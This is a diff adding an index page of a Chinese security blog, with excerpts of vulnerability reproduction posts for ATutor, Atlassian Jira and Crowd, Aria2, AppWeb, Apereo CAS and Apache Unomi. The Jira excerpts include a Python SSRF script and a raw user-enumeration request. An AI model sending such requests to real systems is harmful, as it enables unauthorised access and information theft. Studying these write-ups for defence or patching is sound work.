@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/91/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-ATutor/（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/ATutor/%EF%BC%88CVE-2019-12169%EF%BC%89ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:53.361Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-12169）ATutor学习内容管理系统-任意文件上传漏洞"><a href="#（CVE-2019-12169）ATutor学习内容管理系统-任意文件上传漏洞" class="headerlink" title="（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞"></a>（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>ATutor是ATutor团队的一套开源的基于Web的学习内容管理系统（LCMS）。该系统包括教学内容管理、论坛、聊天室等模块。Atutor与Claroline、<br>Moddle及Sakai号称为四大开源课程管理系统。</p>
+<p>ATutor2.2.4语言导入功能处存在一处安全漏洞(CVE-2019-12169)。攻击者可利用该漏洞进行远程代码执行攻击。</p>
+<p>经过分析发现，除了CVE-2019-1216所报道的语言导入功能外，ATutor在其他功能模块中也大量存在着相似的漏洞，本文会在后面针对这一点进行介绍。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ATutor 2.2.4</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>据漏洞披露可知，漏洞触发点存在于<code>mods/_core/languages/language_import.php</code>文件中</p>
+<p>首先跟入language_import.php文件</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/ATutor/%EF%BC%88CVE-2019-12169%EF%BC%89ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/ATutor/%EF%BC%88CVE-2019-12169%EF%BC%89ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qmxp0037y8v1eexx8von" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Atlassian Jira/（CVE-2019-8451）Atlassian Jira 未授权SSRF漏洞验证" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Atlassian%20Jira/%EF%BC%88CVE-2019-8451%EF%BC%89Atlassian%20Jira%20%E6%9C%AA%E6%8E%88%E6%9D%83SSRF%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81/" class="article-date">
+  <time datetime="2022-07-08T06:25:53.311Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-8451）Atlassian-Jira-未授权SSRF漏洞验证"><a href="#（CVE-2019-8451）Atlassian-Jira-未授权SSRF漏洞验证" class="headerlink" title="（CVE-2019-8451）Atlassian Jira 未授权SSRF漏洞验证"></a>（CVE-2019-8451）Atlassian Jira 未授权SSRF漏洞验证</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><p>Atlassian Jira &lt; 8.4.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="/resource/(CVE-2019-8451)AtlassianJira%E6%9C%AA%E6%8E%88%E6%9D%83SSRF%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81/media/rId24.png"></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/CVE-2019-8451">https://github.com/ianxtianxt/CVE-2019-8451</a></p>
+</blockquote>
+<pre><code>#coding:utf-8
+import requests
+
+host = &#39;http://xx.xx.xx.xx:8080&#39;
+header = &#123;
+                        &#39;X-Atlassian-Token&#39;: &#39;no-check&#39;,
+                        &#39;Connection&#39;: &#39;close&#39;
+                &#125;
+
+url = host + &#39;/plugins/servlet/gadgets/makeRequest?url=&#39;+host+&#39;@www.baidu.com/&#39;
+html = requests.get(url = url,headers = header)
+print html.text
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Atlassian%20Jira/%EF%BC%88CVE-2019-8451%EF%BC%89Atlassian%20Jira%20%E6%9C%AA%E6%8E%88%E6%9D%83SSRF%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Atlassian%20Jira/%EF%BC%88CVE-2019-8451%EF%BC%89Atlassian%20Jira%20%E6%9C%AA%E6%8E%88%E6%9D%83SSRF%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81/" data-id="cl5c2qmww0034y8v1a5zug6u0" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Atlassian Jira/（CVE-2019-8449）Atlassian Jira 信息泄露漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Atlassian%20Jira/%EF%BC%88CVE-2019-8449%EF%BC%89Atlassian%20Jira%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:53.309Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-8449）Atlassian-Jira-信息泄露漏洞"><a href="#（CVE-2019-8449）Atlassian-Jira-信息泄露漏洞" class="headerlink" title="（CVE-2019-8449）Atlassian Jira 信息泄露漏洞"></a>（CVE-2019-8449）Atlassian Jira 信息泄露漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Atlassian<br>Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。<br>Atlassian Jira<br>8.4.0之前版本中的/rest/api/latest/groupuserpicker资源存在信息泄露漏洞。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可利用漏洞获取受影响组件敏感信息。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Atlassian Jira 7.12&lt; 受影响版本&lt;8.4.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>某JIRA站点<a target="_blank" rel="noopener" href="http://www.0-sec.org/">www.0-sec.org</a></p>
+<p>我以目标是虚假的情况下，<a target="_blank" rel="noopener" href="http://www.0-sec.org没有zerosec用户进行请求/">www.0-sec.org没有zerosec用户进行请求</a></p>
+<pre><code>GET /rest/api/latest/groupuserpicker?query=zerosec&amp;maxResults=50&amp;showAvatar=false HTTP/1.1
+Host: www.0-sec.org
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+</code></pre>
+<p>该站点会返回一串json数据，说明找不到该用户</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Atlassian%20Jira/%EF%BC%88CVE-2019-8449%EF%BC%89Atlassian%20Jira%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Atlassian%20Jira/%EF%BC%88CVE-2019-8449%EF%BC%89Atlassian%20Jira%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qmww0035y8v1dai93yxl" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Atlassian Jira/（CVE-2019-11581）Atlassian Jira 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Atlassian%20Jira/%EF%BC%88CVE-2019-11581%EF%BC%89Atlassian%20Jira%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:53.306Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-11581）Atlassian-Jira-远程命令执行漏洞"><a href="#（CVE-2019-11581）Atlassian-Jira-远程命令执行漏洞" class="headerlink" title="（CVE-2019-11581）Atlassian Jira 远程命令执行漏洞"></a>（CVE-2019-11581）Atlassian Jira 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>此漏洞由于Atlassian Jira中的Atlassian Jira Server和Jira Data<br>Center模块存在模板注入，当”联系管理员表单”功能开启时，攻击者可以在表单插入java恶意代码,当服务端对传入数据进行解析时,会执行数据中插入的恶意代码,并执行其中的命令。<strong>攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作</strong>，对服务器造成巨大的影响。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Atlassian Jira 4.4.xAtlassian Jira 5.x.xAtlassian Jira 6.x.xAtlassian Jira 7.0.xAtlassian Jira 7.1.xAtlassian Jira 7.2.xAtlassian Jira 7.3.xAtlassian Jira 7.4.xAtlassian Jira 7.5.xAtlassian Jira 7.6.x &lt; 7.6.14Atlassian Jira 7.7.xAtlassian Jira 7.8.xAtlassian Jira 7.9.xAtlassian Jira 7.10.xAtlassian Jira 7.11.xAtlassian Jira 7.12.xAtlassian Jira 7.13.x &lt; 7.13.5Atlassian Jira 8.0.x &lt; 8.0.3Atlassian Jira 8.1.x &lt; 8.1.2Atlassian Jira 8.2.x &lt; 8.2.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>1.利用前提条件：</strong></p>
+<p>第一种，未授权代码执行利用条件：Jira已配置好SMTP服务器，且需开启”联系网站管理员表单”功能。（从WEB界面设计上看，实际上如果没配置SMTP服务器，无法开启此功能</p>
+<p>第二种利用场景前提是拿到Jira管理员的权限，利用条件较难满足，这里主要分析第一种情况。原因在于atlassian-jira/WEB-INF/classes/com/atlassian/jira/web/action/user/ContactAdministrators<br>未对Subject（邮件主题）处进行过滤，用户传入的邮件主题被当作template（模板）指令执行。在任何一种情况下，成功利用此漏洞的攻击者都可在运行受影响版本的Jira<br>Server或Jira Data Center的系统上执行任意命令。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Atlassian%20Jira/%EF%BC%88CVE-2019-11581%EF%BC%89Atlassian%20Jira%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Atlassian%20Jira/%EF%BC%88CVE-2019-11581%EF%BC%89Atlassian%20Jira%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qmwv0033y8v14dgq64th" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Atlassian Crowd/CVE-2019-11580 Atlassian Crowd RCE" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Atlassian%20Crowd/CVE-2019-11580%20Atlassian%20Crowd%20RCE/" class="article-date">
+  <time datetime="2022-07-08T06:25:53.273Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CVE-2019-11580-Atlassian-Crowd-RCE"><a href="#CVE-2019-11580-Atlassian-Crowd-RCE" class="headerlink" title="CVE-2019-11580 Atlassian Crowd RCE"></a>CVE-2019-11580 Atlassian Crowd RCE</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>攻击者可利用代码执行漏洞，在服务端执行任意代码，实现系统信息窃取等目标，从而造成巨大危害。Atlassian Crowd是一款企业身份管理应用，具有身份管理和单点登录功能，且通过插件进一步扩展了功能。Atlassian Crowd的插件pdkinstall中存在安全缺陷，易导致攻击者上传安装恶意插件进而达到远程代码执行的目的。</p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>本节主要分析Atlassian Crowd的pdkinstall插件信息。输入命令【git clone <a target="_blank" rel="noopener" href="https://bitbucket.org/atlassian/pdkinstall-plugin%E3%80%91">https://bitbucket.org/atlassian/pdkinstall-plugin】</a> 下载插件源码，使用IDEA打开，如下图。</p>
+<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/t0159a7b911809423b4.png">![img](/resource/Untitled/media/t0159a7b911809423b4.png)</a></p>
+<p>首先，分析插件描述文件【atlassian-plugin.xml】。此文件采用XML格式数据重点说明插件模块与servlet的关联信息，内容如下。</p>
+<p><a target="_blank" rel="noopener" href="https://p4.ssl.qhimg.com/t01ba1499cc1fbdc115.png">![img](/resource/Untitled/media/t01ba1499cc1fbdc115.png)</a></p>
+<p>图中标红区域说明，访问/admin/uploadplugin.action会调用servlet功能类com.atlassian.pdkinstall.PdkInstallFilter，完成新插件的上传、检测和安装过程。因此锁定此类为安全缺陷入口。</p>
+<p>接着，分析其源码。在源码中，doFilter()函数是核心函数，涉及关键插件逻辑控制语句，因此我们分两部分来分析该函数源码。第1部分的源码及解析如下。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Atlassian%20Crowd/CVE-2019-11580%20Atlassian%20Crowd%20RCE/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Atlassian%20Crowd/CVE-2019-11580%20Atlassian%20Crowd%20RCE/" data-id="cl5c2qmqy002zy8v13zfjh7ot" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Aria2/（CVE-2016-3088）Aria2 任意文件写入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Aria2/%EF%BC%88CVE-2016-3088%EF%BC%89Aria2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:53.250Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2016-3088）Aria2-任意文件写入漏洞"><a href="#（CVE-2016-3088）Aria2-任意文件写入漏洞" class="headerlink" title="（CVE-2016-3088）Aria2 任意文件写入漏洞"></a>（CVE-2016-3088）Aria2 任意文件写入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持<br>HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Aria2 &lt; 1.18.8</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如<br><a target="_blank" rel="noopener" href="http://binux.github.io/yaaw/demo/">http://binux.github.io/yaaw/demo/</a> 。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/yaaw">https://github.com/ianxtianxt/yaaw</a> 源码在这里，也可自行搭建。</p>
+</blockquote>
+<p>打开yaaw，点击配置按钮，填入运行aria2的目标域名：<code>http://your-ip:6800/jsonrpc</code>:</p>
+<p><img src="/resource/(CVE-2016-3088)Aria2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Aria2/%EF%BC%88CVE-2016-3088%EF%BC%89Aria2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Aria2/%EF%BC%88CVE-2016-3088%EF%BC%89Aria2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qmr70030y8v133fy6prr" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-AppWeb/（CVE-2018-8715）AppWeb认证绕过漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/AppWeb/%EF%BC%88CVE-2018-8715%EF%BC%89AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:53.228Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-8715）AppWeb认证绕过漏洞"><a href="#（CVE-2018-8715）AppWeb认证绕过漏洞" class="headerlink" title="（CVE-2018-8715）AppWeb认证绕过漏洞"></a>（CVE-2018-8715）AppWeb认证绕过漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>AppWeb是Embedthis Software<br>LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web<br>Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web<br>Application容器。</p>
+<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
+<ul>
+<li><p>  basic 传统HTTP基础认证</p>
+</li>
+<li><p>digest<br>  改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</p>
+</li>
+<li><p>  form 表单认证</p>
+</li>
+</ul>
+<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>AppWeb &lt;=7.0.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为<code>admin</code>。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/AppWeb/%EF%BC%88CVE-2018-8715%EF%BC%89AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/AppWeb/%EF%BC%88CVE-2018-8715%EF%BC%89AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qmsr0032y8v18ty62e2k" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apereo CAS/Apereo CAS 4.X execution参数反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apereo%20CAS/Apereo%20CAS%204.X%20execution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:53.175Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Apereo-CAS-4-X-execution参数反序列化漏洞"><a href="#Apereo-CAS-4-X-execution参数反序列化漏洞" class="headerlink" title="Apereo CAS 4.X execution参数反序列化漏洞"></a>Apereo CAS 4.X execution参数反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该攻击媒介特别适用于CAS的所有部署v4.1.x和v4.2.x地方中科院外的开箱默认配置用于管理对象序列化，数据加密和签名部署</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apereo CAS 4.1.x - 4.16</p>
+<p>Apereo CAS 4.1.7 - 4.2x</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在 cas-servlet.xml 中，可以知道对execution参数应该关注 FlowExecutorImpl</p>
+<pre><code>&lt;bean name=&quot;loginFlowExecutor&quot; class=&quot;org.springframework.webflow.executor.FlowExecutorImpl&quot;
+          c:definitionLocator-ref=&quot;loginFlowRegistry&quot;
+          c:executionFactory-ref=&quot;loginFlowExecutionFactory&quot;
+          c:executionRepository-ref=&quot;loginFlowExecutionRepository&quot;/&gt;
+</code></pre>
+<p>在 org/springframework/webflow/executor/FlowExecutorImpl.class:96</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apereo%20CAS/Apereo%20CAS%204.X%20execution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apereo%20CAS/Apereo%20CAS%204.X%20execution%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qmrp0031y8v1c9ds0djs" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache Unomi/Apache Unomi远程代码执行漏洞复现-CVE-2020-13942" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20Unomi/Apache%20Unomi%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-13942/" class="article-date">
+  <time datetime="2022-07-08T06:25:53.149Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Apache-Unomi远程代码执行漏洞复现-CVE-2020-13942"><a href="#Apache-Unomi远程代码执行漏洞复现-CVE-2020-13942" class="headerlink" title="Apache Unomi远程代码执行漏洞复现-CVE-2020-13942"></a>Apache Unomi远程代码执行漏洞复现-CVE-2020-13942</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Unomi 是一个基于标准的客户数据平台（CDP，Customer Data Platform），用于管理在线客户和访客等信息，以提供符合访客隐私规则的个性化体验。在Apache Unomi 1.5.1级以前版本中，存在一处表达式注入漏洞，远程攻击者通过MVEL和OGNL表达式即可在目标服务器上执行任意命令。</p>
+<p><strong>CVE-2020-13942漏洞是对CVE-2020-11975漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，并在服务器执行任意代码</strong></p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote>
+<p>Apache Unomi &lt;1.5.2</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>通过8181和9443两个端口均可触发漏洞，以下以8181为例。</p>
+<p>有两种利用方式：</p>
+<ul>
+<li><p>通过MVEL表达式执行任意命令：</p>
